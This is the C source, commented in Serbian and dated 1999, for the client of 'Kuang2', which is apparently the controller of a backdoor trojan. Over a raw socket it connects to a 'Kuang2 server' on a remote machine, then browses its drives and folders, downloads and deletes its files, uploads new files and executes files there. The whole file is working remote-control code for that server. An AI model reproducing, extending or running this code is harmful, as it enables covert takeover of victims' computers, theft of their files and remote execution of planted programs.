/***[ThuNderSoft]*************************************************************
							KUANG2: Internet Threads
								   ver: 0.19
								˙˘ƒÕ WEIRD Õƒ˘˙
*****************************************************************************/

/* HISTORY */
// ver 0.19 (10-may-1999): upload
// ver 0.17 (09-may-1999): sitna sreîivanja
// ver 0.16 (07-may-1999): ispravljen bug kada folder ima samo subfoldere
// ver 0.15 (28-apr-1999): ispravke shodno novom serveru
// ver 0.10 (06-apr-1999): born code

#include <windows.h>
#include <win95e.h>
#include <winsock.h>
#include <commctrl.h>
#include <ctypew.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>
#include "k2c.h"

extern HWND hDlg;
extern HWND hTV;
extern BOOL connected;

SOCKET conn_socket;

char buffer[BUFFER_SIZE];
char rpath[MAX_PATH];
char strquit[]="&Quit";
char strconn[]="&Connect";
char str_connected[]="Connected.";
extern char path[];
extern TV_ITEM tvItem;
extern TV_ITEM tvRecvItem;
extern TV_INSERTSTRUCT tvInsert;
extern HTREEITEM hthisone;
extern NM_TREEVIEW FAR *nmt;
pMessage k2_msg = (pMessage) buffer;
extern char fajl[];
extern char fajltitle[];

char ack_error[]="Error: acknowledge failed.";

/*
	SayStatus
	---------
  ˛ ispisuje status string */
#define SayStatus(s) SendDlgItemMessage(hDlg, ID_STATUS, WM_SETTEXT, 0, (LPARAM) s)


/*
	send_msg
	--------
  ˛ éalje poruku i sadrÇaj bafera serveru i lovi na greÑke.
  ˛ VraÜa #poslatih bajtova. */

int send_msg(int nbytes)
{
	int retval;

	retval=send(conn_socket, buffer, nbytes, 0);

	if (retval==SOCKET_ERROR) {
		if (WSAGetLastError()!=WSAEWOULDBLOCK)
			SayStatus("Error: can't send data.");
		else retval=0;
	}
	return retval;
}


/*
	recv_msg
	---------------
  ˛ Prima poruku od servera u bafer.
  ˛ VraÜa #primljenih bajtova. */

int recv_msg(void)
{
	unsigned int retval;

	retval=recv(conn_socket, buffer, BUFFER_SIZE, 0);

	if (retval==SOCKET_ERROR)
		SayStatus("Error: can't recieve data.");

	return retval;
}

/*
	dodajTVi
	--------
  ˛ Dodaje TV item na kraj parenta (tvParent)
  ˛ 'imadecu' mora da bude 0 (fajl) ili 1 (folder). To se Åuva u lParam.
	On joÑ pamti koji su folderi otvoreni (2)
  ˛ ako je imadecu==3 onda je to oznaka sa ime kompjutera i preslikava se u 0 */

HTREEITEM dodajTVi (HTREEITEM tvParent, char *string, int imadecu)
{
	extern int iDoc;
	extern int iSystem;
	extern int iFolderX;

	if (imadecu==3) {
		imadecu=0; tvItem.iImage=iSystem;
		tvItem.lParam = 3;
	} else {
		if (imadecu) tvItem.iImage=iFolderX; else tvItem.iImage=iDoc;
		tvItem.lParam = imadecu;
	}
	tvItem.iSelectedImage=tvItem.iImage;

	tvItem.pszText = string;
	tvItem.cchTextMax = strlengthF(string);
	tvItem.cChildren = imadecu;
	tvInsert.hParent = tvParent;
	tvInsert.item = tvItem;		// obavezno na kraju, da bi copy Item->Insert.item
	return TreeView_InsertItem(hTV, &tvInsert);
}

/*
	Aconnect
	--------
  ˛ asinhroni connect - da glavni dijalog ne Åeka previÑe
  ˛ Kada thread zavrÑi svoje onda se Ñalje poruka WM_USER+1 glavnom dijalogu
	da oznaÅi kraj */

DWORD WINAPI Aconnect (LPVOID d)
{
	char ipserver[16];
	struct hostent *hp;
	struct sockaddr_in server;
	unsigned int addr;
	char drives[]="C:";

	EnableWindow(GetDlgItem(hDlg, ID_BUTTON), FALSE);
	connected=FALSE;
	SayStatus("Connecting...");
	TreeView_DeleteAllItems(hTV);	// obriÑi tree-view
	SendDlgItemMessage(hDlg, ID_EDIT, WM_GETTEXT, 16, (LPARAM) ipserver);	// preuzmi IP adresu servera

	if (strlengthF(ipserver)) {
		addr=inet_addr(ipserver);						// pripremi IP adresu
		hp=gethostbyaddr((char *)&addr, 4, AF_INET);	// uzmi host
	} else
		hp=gethostbyname("localhost");                  // ako nije niÑta uneto znaÅi da je lokalno

	if (hp==NULL) {										// ne valja IP adresa
		SayStatus("Error: can't resolve address.");
		goto izlaz;
	}

	_memset(&server,0,sizeof(server));
	_memcopy(&(server.sin_addr),hp->h_addr,hp->h_length);
	server.sin_family=hp->h_addrtype;
	server.sin_port=htons(KUANG2_PORT);
	conn_socket=socket(AF_INET,SOCK_STREAM,0);			// kreiraj socket
	if (conn_socket==INVALID_SOCKET) {
		SayStatus("Error: can't create socket.");
		goto izlaz;
	}

	// Konektuj se na server
	if (connect(conn_socket,(struct sockaddr*)&server,sizeof(server))==SOCKET_ERROR) {
		SayStatus("Error: can't connect to Kuang2.");
		closesocket(conn_socket);
		goto izlaz;
	}

	/* Ovde smo se prikljuÅili na KUANG2 server */

	// primi HELO poruku
	if (recv_msg()==SOCKET_ERROR) {
		closesocket(conn_socket);
		goto izlaz;
	}
	if (k2_msg->command==K2_ERROR) {
		SayStatus("Error: too many users on Kuang2 server.");
		closesocket(conn_socket);
		goto izlaz;
	}
	if (k2_msg->command!=K2_HELO) {
		SayStatus("Error: Kuang2 not found.");
		closesocket(conn_socket);
		goto izlaz;
	}

	// definitivno je dobra konekcija
	SayStatus(str_connected);
	dodajTVi(NULL, k2_msg->sdata, 3);

	// oslobodi se flopija
	addr=(k2_msg->param)>>2;
	while (addr) {
		if (addr & 0x01) dodajTVi(TVI_ROOT, drives, 1);
		drives[0]++;
		addr>>=1;
	}

	// promeni ime buttona
	SendDlgItemMessage(hDlg, ID_BUTTON, WM_SETTEXT, 0, (LPARAM)strquit);
	SayStatus(str_connected);
	connected=TRUE;

izlaz:
	EnableWindow(GetDlgItem(hDlg, ID_BUTTON_CLEAN), !connected);
	EnableWindow(GetDlgItem(hDlg, ID_BUTTON), TRUE);
	SendMessage(hDlg, UM_ASYNCEND, 173, 173); // oznaÅi kraj asinhrone naredbe
	return 0;
}


/*
	Aquit
	-----
  ˛ asinhroni quit - iskljuÅuje se sa servera */

DWORD WINAPI Aquit (LPVOID d)
{
	HTREEITEM tRoot;

	SayStatus("Quiting...");
	// prvo poÑalji poruku da je gotovo
	k2_msg->command=K2_QUIT;
	send_msg(4);
	// iskljuÅi socket
	closesocket(conn_socket);

	SendDlgItemMessage(hDlg, ID_BUTTON, WM_SETTEXT, 0, (LPARAM)strconn);
	SendDlgItemMessage(hDlg, ID_ENAME, WM_SETTEXT, 0, (LPARAM)0);

	// prvo zatvori sve root-ove, poÑto je puno, puno brÇe brisanje zatvorenih
	tRoot=TreeView_GetRoot(hTV);	// uzmi root
	do {
		TreeView_Expand(hTV, tRoot, TVE_COLLAPSE | TVE_COLLAPSERESET);
		tRoot=TreeView_GetNextSibling(hTV, tRoot);
	} while (tRoot!=NULL);

	// pa obriÑi ceo tree-view
	TreeView_DeleteAllItems(hTV);
	connected=FALSE;
	SayStatus("-= not connected =-");
	SendMessage(hDlg, UM_ASYNCEND, 173, 173);
	return 0;
}


/*
	download
	--------
  ˛ download fajla, izdvojen poÑto se koristi na viÑe mesta.
  ˛ ime fajla za download mora biti spremljeno u &buffer[4]
  ˛ koristi pomoÜni niz karaktera 'fajl'.
  ˛ u sluÅaju greÑke vraÜa <> 0 */

int download(void)
{
	HANDLE hfajl;
	unsigned int fsize, downloaded;
	int recieved;
	char *fn;
	DWORD upisano;

	strcopyF(fajl, k2_msg->bdata);				// saÅuvaj ime fajla
	/* faza #1 */
	k2_msg->command=K2_DOWNLOAD_FILE;			// zapoÅni fazu #1
	if (send_msg(BUFFER_SIZE)==SOCKET_ERROR) return 1;

	// primi odgovor da je remote fajl otvoren
	if (recv_msg()==SOCKET_ERROR) return 2;
	if (k2_msg->command==K2_ERROR) {
		SayStatus("Error: can't download file.");
		return 3;
	}
	if (k2_msg->command!=K2_DONE) {
		SayStatus(ack_error);
		return 4;
	}
	fsize=k2_msg->param;						// preuzmi veliÅinu fajla


	/* faza #2 */
	// kreira se lokalni fajl u istom folderu gde je i Kuang2 clijet
	fn=getfilename(fajl);
	setfilename(path, fn);

	hfajl=CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if (hfajl==INVALID_HANDLE_VALUE) {
		SayStatus("Error: can't create local file.");
		goto faza3;								// greÑka, idi na fazu 3
	}

	// burst faze #2
	k2_msg->command=K2_DOWNLOAD_FILE;
	k2_msg->param=2;							// nazanÅi poÅetak faze 2
	if (send_msg(8)==SOCKET_ERROR) goto faza3;	// greÑka, idi na fazu 3

	// sam download, sledeÜih 'fsize' bajtova
	downloaded=0;
	while (downloaded!=fsize) {

		recieved=recv_msg();
		if (recieved==SOCKET_ERROR) break;		// neka greÑka u primanju

		WriteFile(hfajl, buffer, recieved, &upisano, NULL);
		downloaded+=recieved;
		wsprintf(fajl, "Download progress: %2d%%", 100*downloaded/fsize);
		SayStatus(fajl);
	}

	/* faza #3 */
faza3:
	k2_msg->command=K2_DOWNLOAD_FILE;
	k2_msg->param=3;							// naznaÅi kraj rada
	if (send_msg(8)==SOCKET_ERROR) return 5;

	// primi odgovor da je remote fajl otvoren
	if (recv_msg()==SOCKET_ERROR) return 6;
	if (k2_msg->command==K2_ERROR) {
		SayStatus("Error: can't finish download.");
		return 3;
	}
	if (k2_msg->command!=K2_DONE) {
		SayStatus(ack_error);
		return 4;
	}
//	SayStatus("File downloaded.");
	CloseHandle(hfajl);
	return 0;
}

/*
	Adownload
	---------
  ˛ asinhroni download.
  ˛ ime fajla za download mora biti spremljeno u &buffer[4] */

DWORD WINAPI Adownload (LPVOID d)
{
	SayStatus("Downloading...");
	if (!download()) SayStatus("File downloaded.");
	SendMessage(hDlg, UM_ASYNCEND, 173, 173);
	return 0;
}


/*
	fdelete
	-------
  ˛ briÑe remote fajl
  ˛ ime fajla za download mora biti spremljeno u &buffer[4]
  ˛ u sluÅaju greÑke vraÜa <> 0 */

int fdelete(void)
{
	// poÑalji komandu
	k2_msg->command=K2_DELETE_FILE;
	if (send_msg(BUFFER_SIZE)==SOCKET_ERROR) return 1;

	// primi odgovor da je remote fajl obrisan
	if (recv_msg()==SOCKET_ERROR) return 2;
	if (k2_msg->command==K2_ERROR) {
		SayStatus("Error: can't delete remote file.");
		return 3;
	}
	if (k2_msg->command!=K2_DONE) {
		SayStatus(ack_error);
		return 4;
	}
//	SayStatus("File deleted.");
	return 0;
}

/*
	TreeView_FindStr
	----------------
  ˛ pomoÜna funkcija: pronalazi string u TreeView kontroli
  ˛ childovi su dati kao folderi
  ˛ string koji je dat kao parametar se pretvara u mala slova! */

HTREEITEM TreeView_FindStr(HWND htv, char *str)
{
	HTREEITEM ti;
	TV_ITEM tvRecvItem;
	char name[MAX_PATH];
	char *temps=str;
	unsigned int i=0;
	char c;

	while(temps[i]) {
		temps[i]=_to_lower(temps[i]); i++;
	}
	i=0;
	// izdvoji prvi, root elemenat
	while((temps[i]) && (temps[i]!='\\')) i++;
	c=temps[i]; temps[i]=0;
	ti=TreeView_GetRoot(htv);		// uzmi root kao poÅetni

	while (1) {
		tvRecvItem.hItem=ti;							// trenutni htreeitem
		tvRecvItem.mask = TVIF_HANDLE | TVIF_TEXT;		// uzmi ime
		tvRecvItem.pszText = name;						// buffer za ime
		tvRecvItem.cchTextMax = MAX_PATH;
		TreeView_GetItem(htv, &tvRecvItem);				// preuzmi ime
		i=0; while(name[i]) {
			if (name[i]=='<') {name[i-1]=0; break;}     // ime sadrÇi i veliÅinu
			name[i]=_to_lower(name[i]); i++;
		}
		if (!strcompF(name, temps)) {		// ime je isto, ako nije kraj idi dalje i dublje
			if (!c) return ti;				// naÑli smo !!!
			ti=TreeView_GetChild(htv, ti);	// ima joÑ da se ide, uzmi chid
			temps[i]=c;						// povrati string
			if (ti==NULL) break;			// ne postoji viÑe, izaîi
			temps=&temps[i+1]; i=0;			// preuzmi sledeÜe ime
			while((temps[i]) && (temps[i]!='\\')) i++;
			c=temps[i]; temps[i]=0;
		} else {							// ime nije isto, idi na sledeÜe
			ti=TreeView_GetNextSibling(htv, ti);
			if (ti==NULL) break;			// ne postoji sledeÜi, izaîi
		}
	}
	return ti;
}

/*
	Adelete
	-------
  ˛ asinhroni delete
  ˛ ime fajla za download mora biti spremljeno u &buffer[4]
  ˛ mora se voditi raÅuna o tome da fajl koji se briÑe ne mora da bude
	trenutno selektovan */

DWORD WINAPI Adelete (LPVOID d)
{
	HTREEITEM find;
	SayStatus("Deleting...");
	strcopyF(rpath, &buffer[4]);			// zapamti ime fajla
	if (!fdelete()) {						// ako je fajl obrisan
		find=TreeView_FindStr(hTV, rpath);	// naîi ga u treeview listi
		if (find!=NULL)						// ako je naîen...
			TreeView_DeleteItem(hTV, find); // ...onda ga obriÑi!
		SayStatus("File deleted.");
	}
	SendMessage(hDlg, UM_ASYNCEND, 173, 173);
	return 0;
}

/*
	Adirlist
	--------
  ˛ u 'k2_msg->bdata' je string sa putanjom koju treba izlistati.
  ˛ javlja se samo kada se 2x klikne na foldere. */

DWORD WINAPI Adirlist (LPVOID d)
{
	HANDLE hf;
	char *bbb;
	char *bp;
	char *sstart;
	unsigned int fsize, pointer;
	DWORD procitano;
	extern int iFolder;

	SayStatus("Getting folder info...");
	k2_msg->command=K2_FOLDER_INFO;
	if (send_msg(BUFFER_SIZE)==SOCKET_ERROR) goto izlaz;
	if (recv_msg()==SOCKET_ERROR) goto izlaz;
	if (k2_msg->command==K2_ERROR) {
		SayStatus("Error: folder info error.");
		goto izlaz;
	}
	if (k2_msg->command!=K2_DONE) {
		SayStatus(ack_error);
		goto izlaz;
	}
	// ako ima fajlova u folderu onda pokupi fajl sa podacima

	// prvo download fileinfo fajl
	strcopyF(rpath, k2_msg->bdata);
	if (download()) goto izlaz;
	// pa ga onda obriÑi
	strcopyF(k2_msg->bdata, rpath);
	if (fdelete()) goto izlaz;

	// sada je u path ime lokalnog fajla koji sadrÇi info...
	hf=CreateFile(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if (hf==INVALID_HANDLE_VALUE) {
		SayStatus("Error: can't open local filelist.");
		goto izlaz;
	}
	fsize=GetFileSize(hf, NULL);				// uzmi veliÅinu fajla
	if (fsize==0) {
		CloseHandle(hf);
		SayStatus("Error: local filelist is empty.");
		goto izlaz;
	}
	bbb=GlobalAlloc(GMEM_FIXED, fsize+1);		// toliko i alociraj
	if (bbb==NULL) {
		CloseHandle(hf);
		SayStatus("Error: can't allocate memory.");
		goto izlaz;
	}
	ReadFile(hf, bbb, fsize, &procitano, NULL); // pa proÅitaj
	CloseHandle(hf);							// zatvori fajl

	// dodaj prvo foldere...
	pointer=0; sstart=bp=bbb; fsize--; procitano=0;
	while (pointer<fsize) {
		while (bp[pointer]) pointer++;			// naîi kraj stringa
		if (sstart[0]=='*') {                   // folder, nastavi
			if ( (strcompF(sstart,"*.")) && (strcompF(sstart, "*.."))) {
				dodajTVi(hthisone, &sstart[1], 1);
				procitano=1;
			}
		}
		pointer++;
		sstart=&bp[pointer];				// idemo dalje
	}

	// ...a zatim i fajlove
	pointer=0; sstart=bp=bbb; fsize--;
	while (pointer<fsize) {
		while (bp[pointer]) pointer++;			// naîi kraj stringa
		if (sstart[0]!='*') {                   // nije folder, nastavi
			dodajTVi(hthisone, sstart, 0);
			procitano=1;
		}
		pointer++;
		sstart=&bp[pointer];				// idemo dalje
	}

	// Kraj, sve je proÑlo OK.
	GlobalFree(bbb);
	tvRecvItem.cChildren=1;


	if (!procitano) tvRecvItem.cChildren=0;		// ako je folder prazan

	// boldiraj i oznaÅi folder
	tvRecvItem.mask = TVIF_STATE | TVIF_PARAM | TVIF_HANDLE | TVIF_IMAGE | TVIF_SELECTEDIMAGE | TVIF_CHILDREN;
	tvRecvItem.hItem = hthisone;
	tvRecvItem.state = TVIS_BOLD;
	tvRecvItem.stateMask = TVIS_BOLD;
	tvRecvItem.iImage=tvRecvItem.iSelectedImage=iFolder;
	tvRecvItem.lParam = 2;					// oznaÅi da je folder veÜ otvaran
	TreeView_SetItem(hTV, &tvRecvItem);

	TreeView_Expand(hTV, hthisone, TVE_EXPAND);		// i otvori ga
	TreeView_SelectSetFirstVisible(hTV, hthisone);	// namesti ga na vrh
	SayStatus(str_connected);

izlaz:
	DeleteFile(path);
	SendMessage(hDlg, UM_ASYNCEND, 173, 173);
	return 0;
}


/*
	Arun
	----
  ˛ u 'k2_msg->bdata' je string sa putanjom koju treba startovati. */

DWORD WINAPI Arun (LPVOID d)
{
	SayStatus("Executing...");
	k2_msg->command=K2_RUN_FILE;
	if (send_msg(BUFFER_SIZE)==SOCKET_ERROR) goto izlaz;
	if (recv_msg()==SOCKET_ERROR) goto izlaz;
	if (k2_msg->command==K2_ERROR) {
		SayStatus("Error: can't run remote file.");
		goto izlaz;
	}
	if (k2_msg->command!=K2_DONE) {
		SayStatus(ack_error);
		goto izlaz;
	}
	SayStatus("File executed.");
izlaz:
	SendMessage(hDlg, UM_ASYNCEND, 173, 173);
	return 0;
}


/*
	Aupload
	-------
  ˛ u 'k2_msg->bdata' je remote folder gde treba staviti fajl.
  ˛ u 'fajl' je putanja do lokalnog fajla. */

DWORD WINAPI Aupload (LPVOID d)
{
	HANDLE hfajl;
	unsigned int fajlsize, fsize, tosend;
	int bytes_sent;
	DWORD procitano;
	HTREEITEM hfol;
	TV_ITEM tvitem;
	char remote_path[MAX_PATH];
#define		ii		tosend

	strcopyF(remote_path, k2_msg->bdata);
	SayStatus("Uploading...");

	/* faza #1 */
	hfajl=CreateFile(fajl, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
	fajlsize=GetFileSize(hfajl, NULL);
	if ((fajlsize==0xFFFFFFFF) || (hfajl==INVALID_HANDLE_VALUE)) {
		SayStatus("Error: can't open local file.");
		goto izlaz;
	}
	fsize=fajlsize;

	k2_msg->command=K2_UPLOAD_FILE;
	strcopyF(rpath, k2_msg->bdata);
	k2_msg->param=fajlsize;
	strcopyF(k2_msg->sdata, rpath);
	setfilename(k2_msg->sdata, getfilename(fajl));

	if (send_msg(BUFFER_SIZE)==SOCKET_ERROR) goto izlaz;
	if (recv_msg()==SOCKET_ERROR) goto izlaz;
	if (k2_msg->command==K2_ERROR) {
		SayStatus("Error: can't upload file.");
		goto izlaz;
	}
	if (k2_msg->command!=K2_DONE) {
		SayStatus(ack_error);
		goto izlaz;
	}

	/* faza #2 */

	while (fajlsize) {
		tosend=BUFFER_SIZE;
		if (tosend>fajlsize) tosend=fajlsize;
		SetFilePointer(hfajl, -fajlsize, NULL, FILE_END);
		ReadFile(hfajl, buffer, tosend, &procitano, NULL);
		bytes_sent=send(conn_socket, buffer, tosend, 0);	// poÑalji 1KB fajla
		if (bytes_sent==SOCKET_ERROR) {
			if (WSAGetLastError()!=WSAEWOULDBLOCK) break;
			else bytes_sent=0;
		}
		wsprintf(rpath, "Upload progress: %2d%%", 100*(fsize-fajlsize)/fsize);
		SayStatus(rpath);
		fajlsize-=(bytes_sent);
	}

	// faza #3 - zatvori handle i javi da je OK
	if (recv_msg()==SOCKET_ERROR) goto izlaz;
	if (k2_msg->command!=K2_DONE) {
		SayStatus(ack_error);
		goto izlaz;
	}
	SayStatus("File uploaded.");

	// faza #3b - ubaci novi fajl u listu ako moÇe !!!
	// prvo vidi da li veÜ postoji
	strcopyF(rpath, remote_path);
	straddF(rpath, getfilename(fajl));
	hfol=TreeView_FindStr(hTV, rpath);			// naîi item fajla
	if (hfol) TreeView_DeleteItem(hTV, hfol);	// ako postoji obriÑi ga

	// dodaj novi item
	ii=0;
	while(remote_path[ii]) ii++;
	remote_path[ii-1]=0;						// oslobodi se poslednjeg sleÑa

	hfol=TreeView_FindStr(hTV, remote_path);	// naîi item foldera
	if (!hfol) goto izlaz;

	tvitem.mask=TVIF_PARAM | TVIF_HANDLE;
	tvitem.hItem=hfol;
	TreeView_GetItem(hTV, &tvitem);				// preuzmi osobine folder
	if (tvitem.lParam!=2) goto izlaz;			// ako folder nije otvoren onda izaîi


	ii=fsize >> 10;								// veliÅina fajla u KB
	if (fsize) ii++;							// da 0 fajl bude zaista 0
	wsprintf(remote_path, "%s <%1luk>", getfilename(fajl), ii);
	hfol=dodajTVi(hfol, remote_path, 0);		// dodaj item na kraj
	TreeView_SelectItem(hTV, hfol);

izlaz:
	SendMessage(hDlg, UM_ASYNCEND, 173, 173);
	return 0;
}
